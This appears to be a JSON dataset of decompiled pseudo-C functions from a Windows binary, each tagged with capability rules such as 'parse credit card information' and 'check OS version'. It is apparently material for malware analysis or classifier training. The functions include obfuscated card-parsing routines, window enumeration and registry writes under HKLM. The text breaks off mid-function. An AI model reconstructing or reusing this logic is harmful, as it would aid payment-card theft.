{
    "004010a0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401135) overlaps instruction at (ram,0x00401134)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004010a0(uchar *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    uchar uVar3;\n    char cVar5;\n    uint32_t uVar4;\n    uint8_t uVar6;\n    uint32_t in_EDX;\n    uint unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    int32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    bool bVar9;\n    float10 in_ST0;\n    \n    puVar7 = &stack0xfffffffc;\n    *arg_8h = 0xce;\n    arg_8h[1] = 0x5c;\n    cVar5 = arg_8h >> 8;\n    uVar3 = SUB41(arg_8h, 0);\n    uVar4 = (arg_8h & 0xffff0000 | CONCAT11(cVar5 - unaff_EBX, uVar3)) - in_EDX;\n    bVar9 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    arg_8h[2] = 0xf2;\n    if ((-1 < uVar4) && (-1 >= uVar4)) {\n        pcVar1 = unaff_EDI + 4;\n        *(unaff_EDI + 0x1c) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        bVar9 = (POPCOUNT(*(unaff_ESI + 4) - *pcVar1) & 1U) == 0;\n    }\n    arg_8h[3] = 100;\n    if ((!bVar9) && (bVar9)) {\n        puVar8 = &stack0xfffffff0;\n        cVar5 = '\\x1e';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar5 = cVar5 + -1;\n        } while ('\\0' < cVar5);\n        uVar2 = in(0x78);\n        return CONCAT44(in_EDX, uVar2);\n    }\n    arg_8h[4] = 0xa1;\n    if ((!bVar9) && (bVar9)) {\n        return CONCAT44(in_EDX, arg_8h + -0x8999f5e);\n    }\n    arg_8h[5] = 0xa2;\n    uVar4 = arg_8h & 0xffff0000 | CONCAT11(cVar5 - unaff_EBX, uVar3);\n    arg_8h[6] = 0x25;\n    if ((uVar4 < in_EDX) || (in_EDX <= uVar4)) {\n        arg_8h[7] = 0xfc;\n    }\n    else {\n        arg_8h = arg_8h + 1;\n    }\n    arg_8h[8] = 0x84;\n    arg_8h[9] = 0x2e;\n    uVar6 = in_EDX ^ unaff_EBX >> 8 | 0x67;\n    arg_8h[10] = 0x18;\n    if ((uVar6 != 0) && (uVar6 == 0)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_8h[0xb] = 0x93;\n    if ((-1 < uVar6) && (-1 >= uVar6)) {\n        arg_8h = arg_8h + -1;\n        *(unaff_EDI | &stack0xfffffffc) = uVar3;\n        in_EDX = in_EDX & 0xffffff00;\n    }\n    arg_8h[0xc] = 0xac;\n    *arg_ch = 0xd;\n    return CONCAT44(in_EDX, arg_ch);\n}\n",
        "token_count": 936
    },
    "004019d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a74) overlaps instruction at (ram,0x00401a70)\n// \n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004019d0(int32_t *hWnd)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint *in_FS_OFFSET;\n    uint8_t uVar10;\n    uint8_t in_AF;\n    char cVar11;\n    char cVar12;\n    unkbyte10 extraout_ST0;\n    ulong uVar13;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t pbstr;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t Msg;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405030;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    Msg = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    uVar10 = 0;\n    cVar12 = '\\0';\n    cVar11 = '\\0';\n    uVar13 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, Msg, 0, 0, 2, 1000, &var_18h);\n    piVar8 = uVar13 >> 0x20;\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        *(uVar13 + -0x7ce92414) = extraout_ST0;\n        uVar3 = uVar13 - 1;\n        uVar2 = uVar3;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = uVar2 + in_AF * '\\x06';\n        uVar3 = uVar3 & 0xffffff00 | uVar2 + (0x90 < (uVar2 & 0xf0) | uVar10 | in_AF * (0xf9 < uVar2)) * '`';\n        *piVar8 = *piVar8 + 0x458bdf84;\n        puVar1 = uVar3 - 1;\n        uVar10 = *puVar1;\n        uVar2 = uVar13 >> 0x20;\n        *puVar1 = *puVar1 + uVar2;\n        pcVar4 = sym.imp.KERNEL32.dll_GetProcAddress + CARRY1(uVar10, uVar2) + uVar3;\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x4235b4);\n    }\n    if (pcVar4 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar5 = (*pcVar4)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar5 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_28h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar5 = (**(*var_20h + 0x20))(var_20h, &var_28h);\n        if ((iVar5 < 0) || (var_28h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_28h + 0x24))(var_28h, &var_1ch);\n            Msg = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_30h = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_30h = var_30h % var_1ch;\n                    var_38h = CONCAT22(var_38h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar5 = (**(*var_28h + 0x2c))\n                                      (var_28h, var_38h, var_34h, var_30h, var_2ch, var_38h, var_34h, var_30h, var_2ch, \n                                       &hWnd);\n                    if ((iVar5 < 0) || (hWnd == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x00401e01:\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00401e0d:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                        break;\n                    }\n                    iVar5 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if ((iVar5 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00401dc8:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00401e0d;\n                    }\n                    iVar5 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar5 < 0) {\ncode_r0x00401d89:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x00401dc8;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00401c04:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401800(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4235c8);\n                        if (iVar6 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00401c04;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar5 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar5 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x00401dad:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x00401e01;\n                        }\n                        iVar5 = (**(*var_14h + 0x20))(var_14h, &var_40h);\n                        iVar6 = var_40h;\n                        if (iVar5 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00401dad;\n                        }\n                        if (var_40h == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.00401800(iVar6, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_40h);\n                            iVar6 = fcn.00401920(&var_148h);\n                            if (iVar6 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x00401d89;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                    Msg = Msg + 1;\n                } while (Msg < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar5;\n}\n",
        "token_count": 3080
    },
    "00402f50": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031cf) overlaps instruction at (ram,0x004031c6)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall fcn.00402f50(uint param_1)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    ushort uVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint uVar7;\n    ushort extraout_CX;\n    uint8_t extraout_CH;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    ushort extraout_DX;\n    int32_t iVar8;\n    char *unaff_EBX;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *unaff_ESI;\n    int32_t iVar13;\n    uint32_t unaff_EDI;\n    uint uVar14;\n    ushort in_SS;\n    bool in_CF;\n    uchar uVar15;\n    bool bVar16;\n    bool in_ZF;\n    uchar uVar17;\n    ulong uVar18;\n    unkbyte3 Var19;\n    uchar uVar20;\n    uchar in_stack_ffffffe8;\n    ushort in_stack_ffffffe9;\n    uchar in_stack_ffffffeb;\n    uchar in_stack_ffffffec;\n    ushort in_stack_ffffffed;\n    uchar in_stack_ffffffef;\n    uchar in_stack_fffffff0;\n    ushort in_stack_fffffff1;\n    uchar in_stack_fffffff3;\n    \n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        in_stack_fffffff0 = 0x20;\n        in_stack_fffffff1 = 0;\n        in_stack_fffffff3 = 0;\n        in_stack_ffffffec = 0x28;\n        in_stack_ffffffed = 0x4235;\n        in_stack_ffffffef = 0;\n        in_stack_ffffffe8 = 0x18;\n        in_stack_ffffffe9 = 0;\n        in_stack_ffffffeb = 0;\n    }\n    cVar2 = *unaff_EBX;\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe8;\n    *(in_EAX + 0x28) = *(in_EAX + 0x28) & (param_1 >> 8) - cVar2;\n    uVar15 = false;\n    uVar17 = in_EAX == 0x186a0042;\n    uVar5 = fcn.00402220(0x423194, CONCAT13(in_stack_ffffffeb, CONCAT21(in_stack_ffffffe9, in_stack_ffffffe8)), \n                         CONCAT13(in_stack_ffffffef, CONCAT21(in_stack_ffffffed, in_stack_ffffffec)), \n                         CONCAT13(in_stack_fffffff3, CONCAT21(in_stack_fffffff1, in_stack_fffffff0)));\n    if ((!uVar15 && !uVar17) && (uVar15 || uVar17)) {\n        uVar15 = 0;\n        uVar17 = (uVar5 & 0xe2f4cc58) == 0;\n    }\n    uVar20 = 0;\n    Var19 = 0x423194;\n    fcn.00402220(0x423194, 0x18, 0x423548, 0x26);\n    if ((!uVar15 && !uVar17) && (uVar15 || uVar17)) {\n        unaff_ESI = CONCAT13(uVar20, Var19);\n    }\n    fcn.00402220(0x423194, 0x18, 0x423570, 8);\n    fcn.00402220(0x423194, 0x18, 0x423578, 0x19);\n    puVar6 = fcn.00402220(0x423194, 0x18, 0x423594, 0xb);\n    *(unaff_EDI & 0xffff0000 | unaff_EDI & 0xff00 | unaff_EDI) = *unaff_ESI;\n    uVar15 = 0;\n    bVar16 = (POPCOUNT((&stack0xffffffdb ^ 0x186a0042) & 0xff) & 1U) == 0;\n    puVar6[-1] = 0x423194;\n    puVar6[-2] = 0x40302f;\n    fcn.00402220(puVar6[-1], *puVar6, puVar6[1], puVar6[2]);\n    if ((!bVar16) && (bVar16)) {\n        puVar9 = puVar6 + -2;\n        puVar6[-2] = 0x6ae181d0;\n        puVar3 = 0x6ae181d0;\n        cVar2 = '\\x1e';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar3;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        puVar6[-0x21] = puVar6 + -2;\n        uVar7 = in(0x78);\n        return uVar7;\n    }\n    puVar6[-2] = 0x12;\n    puVar6[-3] = 0x4235b4;\n    puVar6[-4] = 0x18;\n    puVar10 = puVar6 + -5;\n    puVar6[-5] = 0x423194;\n    puVar6[-6] = 0x40305e;\n    fcn.00402220(puVar6[-5], puVar6[-4], puVar6[-3], puVar6[-2]);\n    if ((uVar15) || (!uVar15)) {\n        puVar10 = puVar6 + -6;\n        puVar6[-6] = 2;\n    }\n    puVar10[-1] = 0x4235c8;\n    puVar10[-2] = 0x18;\n    puVar10[-3] = 0x423194;\n    puVar10[-4] = 0x403088;\n    uVar4 = fcn.00402220(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n    puVar10[0xc] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    *(puVar10 + 0x2e) = uVar4;\n    bVar16 = false;\n    uVar7 = puVar10[0xc];\n    puVar10[0xc] = 8;\n    puVar10[0xb] = 0x4235cc;\n    puVar10[10] = 0x18;\n    puVar11 = puVar10 + 9;\n    puVar10[9] = 0x423194;\n    puVar10[8] = 0x4030bd;\n    fcn.00402220(puVar10[9], puVar10[10], puVar10[0xb], puVar10[0xc]);\n    if ((bVar16) || (*(puVar10 + 0x22) = extraout_CX,  !bVar16)) {\n        puVar11 = puVar10 + 8;\n        puVar10[8] = 8;\n    }\n    *(puVar11 + -1) = in_SS;\n    uVar14 = puVar11[-1];\n    puVar11[-1] = 0x47;\n    puVar11[-2] = 0x4235d4;\n    puVar11[-3] = 0x18;\n    puVar11[-4] = 0x423194;\n    puVar11[-5] = 0x4030e1;\n    fcn.00402220(puVar11[-4], puVar11[-3], puVar11[-2], puVar11[-1]);\n    puVar11[3] = extraout_ECX;\n    puVar11[3] = 6;\n    puVar11[2] = 0x4235dc;\n    puVar11[1] = 0x18;\n    *puVar11 = 0x423194;\n    puVar11[-1] = 0x403102;\n    uVar18 = fcn.00402220(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar11[3] = uVar18;\n    puVar11[2] = extraout_ECX_00;\n    puVar11[1] = uVar18 >> 0x20;\n    *puVar11 = uVar7;\n    puVar11[-1] = puVar11 + 4;\n    puVar11[-2] = 0x6ae181d0;\n    puVar11[-3] = unaff_ESI + 1;\n    puVar11[-4] = uVar14;\n    uVar14 = puVar11[-4];\n    iVar13 = puVar11[-3];\n    uVar7 = *puVar11;\n    puVar11[3] = 7;\n    puVar11[2] = 0x4235e4;\n    puVar11[1] = 0x18;\n    *puVar11 = 0x423194;\n    puVar11[-1] = 0x40312b;\n    uVar4 = fcn.00402220(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar11[3] = uVar14;\n    *(puVar11 + 10) = uVar4;\n    *(puVar11 + 2) = extraout_DX;\n    puVar11[3] = 7;\n    puVar11[2] = 0x4235ec;\n    puVar11[1] = 0x18;\n    *puVar11 = 0x423194;\n    puVar11[-1] = 0x403158;\n    uVar18 = fcn.00402220(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar11[3] = uVar18;\n    puVar11[2] = uVar18 >> 0x20;\n    puVar11[3] = 6;\n    puVar11[2] = 0x4235f4;\n    puVar11[1] = 0x18;\n    *puVar11 = 0x423194;\n    puVar11[-1] = 0x40318a;\n    fcn.00402220(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    puVar11[3] = uVar7;\n    puVar11[2] = extraout_ECX_01;\n    bVar16 = false;\n    puVar11[3] = 0x25;\n    puVar11[2] = 0x4235fc;\n    puVar11[1] = 0x18;\n    *puVar11 = 0x423194;\n    puVar11[-1] = 0x4031b6;\n    uVar18 = fcn.00402220(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n    iVar8 = uVar18 >> 0x20;\n    if (!bVar16) {\n        puVar11[-1] = iVar8;\n        iVar8 = puVar11[-1];\n        if (bVar16) goto code_r0x004031c0;\n    }\n    puVar11[-1] = 8;\n    puVar11[-2] = 0x423624;\n    puVar12 = puVar11 + -3;\n    puVar11 = puVar11 + -3;\n    *puVar12 = 0x18;\ncode_r0x004031c0:\n    *(iVar13 + 0x43d1773a) = *(iVar13 + 0x43d1773a) ^ 0x6a27e95e;\n    puVar1 = uVar18 + (bVar16 == false) + 0x7c8ecb31;\n    *puVar1 = *puVar1 | extraout_CH;\n    *(iVar8 + 0x19) = *(iVar8 + 0x19) + extraout_CH;\n    puVar11[-1] = 0x423194;\n    puVar11[-2] = 0x4031e2;\n    uVar7 = fcn.00402220(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    return uVar7;\n}\n",
        "token_count": 2896
    },
    "00403430": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034fb) overlaps instruction at (ram,0x004034fa)\n// \n// WARNING: Removing unreachable block (ram,0x004034fb)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00403430(char *arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    char cVar3;\n    char *pcVar2;\n    int32_t in_ECX;\n    char cVar4;\n    int32_t unaff_EBX;\n    char **unaff_EDI;\n    char **ppcVar5;\n    uint8_t in_AF;\n    bool bVar6;\n    bool bVar7;\n    int16_t iStack24;\n    \n    *arg_8h = -0x2e;\n    pcVar2 = arg_8h;\n    while( true ) {\n        iStack24 = in_ECX;\n        arg_8h[1] = -0x6d;\n        bVar6 = (CONCAT11(((pcVar2 >> 8) - unaff_EBX) + 'M', pcVar2) & 0x26ae) != 1;\n        arg_8h[2] = -0xd;\n        if ((bVar6) && (!bVar6)) {\n            pcVar2 = pcVar2 & 0xe2f4cc58;\n        }\n        arg_8h[3] = '\\x19';\n        bVar6 = (iStack24 - 1U & unaff_EDI | 0x61be) != 0;\n        arg_8h[4] = 'J';\n        if ((bVar6) && (!bVar6)) break;\n        arg_8h[5] = 'y';\n        bVar7 = SCARRY4(unaff_EBX, 1);\n        bVar6 = unaff_EBX + 1 < 0;\n        arg_8h[6] = -0x6c;\n        uVar1 = pcVar2;\n        cVar3 = pcVar2 >> 8;\n        if ((unaff_EBX == -1 || bVar7 != bVar6) || (unaff_EBX != -1 && bVar7 == bVar6)) {\n            arg_8h[7] = '}';\n            ppcVar5 = unaff_EDI;\n            if ((bVar7 == bVar6) && (bVar7 != bVar6)) {\n                out(0xc4, pcVar2);\n                arg_8h = arg_8h & 0xffffff00 | arg_8h ^ in_ECX;\n                ppcVar5 = unaff_EDI + 1;\n                *unaff_EDI = pcVar2;\n                cVar4 = unaff_EBX >> 8;\n                bVar7 = SBORROW1(cVar4, *pcVar2);\n                bVar6 = cVar4 - *pcVar2 < '\\0';\n            }\n            arg_8h[8] = -0x77;\n            if ((bVar7 == bVar6) && (bVar7 != bVar6)) {\n                arg_8h = arg_8h & 0xffffff00;\n                *(ppcVar5 | &stack0xfffffffc) = uVar1;\n                pcVar2 = pcVar2 & 0xffff0000 | uVar1 + cVar3 * 'y';\n            }\n            arg_8h[9] = -0x3e;\n            *arg_ch = 10;\n            return CONCAT44(arg_8h, pcVar2);\n        }\n        in_AF = 9 < (uVar1 & 0xf) | in_AF;\n        pcVar2 = pcVar2 & 0xffff0000 | CONCAT11(cVar3 + in_AF, uVar1 + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 906
    },
    "00401220": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401220(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x423228, arg_8h);\n    (*pcVar2)(&var_268h, 0x423240, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_4ch = &var_164h;\n    var_38h = 0x423268;\n    var_34h = 0x423274;\n    var_30h = 0x423280;\n    var_2ch = 0x423290;\n    var_28h = 0x423298;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_3ch = &var_ch;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1100
    },
    "00401510": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint64_t fcn.00401510(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 151
    },
    "00402000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004021d0) overlaps instruction at (ram,0x004021cf)\n// \n// WARNING: Variable defined which should be unmapped: var_25fh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402000(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DL;\n    char extraout_DL_00;\n    char cVar3;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar uVar7;\n    ushort uVar8;\n    ushort uVar9;\n    ushort uVar10;\n    ushort uVar11;\n    uchar uVar12;\n    ushort uVar13;\n    uint noname_3;\n    uchar var_260h;\n    uint var_25fh;\n    uint in_stack_fffffda4;\n    uint in_stack_fffffda8;\n    uint in_stack_fffffdac;\n    uint in_stack_fffffdb0;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = unaff_EBX;\n    fcn.00402f50();\n    iVar1 = fcn.00401830();\n    if (iVar1 != 0) {\n        _var_260h = _var_260h & 0xffffff00;\n        puVar4 = 